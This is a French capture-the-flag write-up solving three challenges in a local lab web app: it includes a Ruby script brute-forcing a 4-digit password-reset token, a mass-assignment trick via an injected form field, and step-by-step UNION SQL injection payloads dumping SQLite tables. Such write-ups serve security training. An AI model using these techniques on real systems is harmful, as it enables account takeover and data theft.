
# Flag 1

> `FLAG-88541066556eecf7269cf2a4d0220222`

On fait un peut reconnaissance, on trouve le fichier `robots.txt` qui demande au robots du web d'indexer le page `/help-center`.

```
user-agent: *
Allow: /help-center
```

En navigant à cette page on voit plusieurs articles d'aide.

L'article **Password Reset** explique comment faire un changement de mot de passe. On constate que le jeton de changement de mot de passe est composé de seulement 4 chiffres, il y a donc seulement `10 ^ 4 = 10 000` possibilité ce qui est facilement récupérable par force brute.

Une autre information intéressante est l'adresse courriel utilisé pour la démo.

```
support@invoicer.com
```

Notre objectif est faire un changement de mot de passe sur cet utilisateur pour pouvoir ce connecter avec son compte.

On peut aussi constater que le jeton de mot de passe peu seulement être regénéré à toute les 10 minutes, ce qui nous donne assez de temps pour le trouver par force brute.

Il est possible d'écrire un script afin de trouver le jeton en question, voici un exemple en [Ruby](https://www.ruby-lang.org/en/).

```ruby
require 'net/http'

uri = URI('http://localhost:3000/')
(0..9999).each do |number|
  token = number.to_s.rjust(4, '0')
  print "\r#{token}"
  uri.path = "/password_resets/#{token}/edit"
  response = Net::HTTP.get_response(uri)
  if response.code == '200'
    puts "\n#{uri}"
    break if response.body.include?('Invoicer Support Account')
  end
end
```

Une fois le jeton trouvé change le mot de passe manuellement en visitant l'URL de changement de mot de passe.

Une fois connecté avec l'account on obtient le drapeau.

# Flag 2

> `FLAG-94b98c9a4246392468e57df1a85cc649`

Si on essaye d'aller à la page "Metrics" on a un message d'erreur:

```
Forbidden: your account is limited to the basic feature.
```

On fait un peut reconnaissance, on voit qu'il y a un commentaire dans le code HTML de la page "Profile".

```html
  <!-- NOTE: Every account except the internal account is in demo for the moment. -->
  <!--
  <div class="form-group form-check">
    <input name="user[demo]" type="hidden" value="0" /><input class="form-check-input" type="checkbox" value="1" checked="checked" name="user[demo]" id="user_demo" />
    <label class="form-check-label" for="user_demo">Demo</label>
    <small class="form-text text-muted">Features are limited in demo.</small>
  </div>
  -->
```

Il est impossible de changer le champ `user[demo]` via la page de "Profile". Mais il est possible de créer un nouveau compte avec ce champ.

Il est possible de modifier le HTML de la page "Register" et d'ajouter le input `user[demo]` et mettre la valeur à `0`.

Par la suite on peut créer l'account sans restriction puis visiter la page "Metrics".

# Flag 3

> `FLAG-47e3607c41a277b261556cc39bfe3e38`

On voit qu'il y a une injection SQL en cherchant une _invoice_ avec le keyword `'` car on obtient une erreur.

On détermine le context de la requête par essaie et erreur. On se rend compte qu'il est possible de tout afficher les _invoices_ avec cette requête.

```
') OR 1) --
```

On peut trouver le nombre de colonnes de la requête `SELECT` avec l'opérateur `UNION` et une autre requête `SELECT`. Il suffit d'augmenter le nombre de colonne jusqu'à ce que le résultat du deuxième `SELECT` soit affiché.

```
') OR 1) UNION SELECT 1 --
```

```
') OR 1) UNION SELECT 1,2 --
```

```
') OR 1) UNION SELECT 1,2,3 --
```

...

On continue jusqu'à cette requête.

```
') OR 1) UNION SELECT 1,2,3,4,5,6,7,8,9 --
```

Maintenant on peut détermine que la base de données utilisée est [SQLite](https://www.sqlite.org/) avec cette requête:

```
') OR 1) UNION SELECT 1,2,3,sqlite_version(),5,6,7,8,9 --
```

Dans _SQLite_ la table `sqlite_master` contient le schéma de la base de données. Il suffit de selectionner la colonne `sql` pour avoir le code _SQL_ utiliser pour la création de celle-ci. Puisque les champs sont _truncate_ à l'affichage on peut selectionner en plusieurs requêtes ou sur plusieurs colonnes.

```
') OR 1) UNION SELECT 1,2,3,substr(sql,0, 24),substr(sql,24, 48),6,7,8,9 FROM sqlite_master --
```

On trouve la table `"super_hidden_secret_features"`, maintenant on chercher ses colonnes.

```
') OR 1) UNION SELECT 1,2,3,substr(sql,62, 24),substr(sql,86, 24),6,7,8,9 FROM sqlite_master WHERE sql LIKE "%super_hidden_secret_features%"--
```

```
') OR 1) UNION SELECT 1,2,3,substr(sql,110, 24),substr(sql,134, 24),6,7,8,9 FROM sqlite_master WHERE sql LIKE "%super_hidden_secret_features%"--
```

```
') OR 1) UNION SELECT 1,2,3,substr(sql,158, 24),substr(sql,182, 24),6,7,8,9 FROM sqlite_master WHERE sql LIKE "%super_hidden_secret_features%"--
```

```
') OR 1) UNION SELECT 1,2,3,substr(sql,206, 24),substr(sql,230, 24),6,7,8,9 FROM sqlite_master WHERE sql LIKE "%super_hidden_secret_features%"--
```

On obtient le schéma SQL suivant:

```sql
CREATE TABLE "super_hidden_secret_features" ("id" integer PRIMARY KEY AUTOINCREMENT NOT NULL, "name" varchar NOT NULL, "hidden" boolean DEFAULT 1 NOT NULL, "created_at" datetime(6)	NOT NULL, "updated_at" datetime(6) NOT NULL)
```

Maintenant on peu lire les données dans cette table:

```
') OR 1) UNION SELECT 1,2,3,substr(name, 0, 24),substr(name, 24, 48),6,7,8,9 FROM super_hidden_secret_features --
```

On obtient le drapeau!
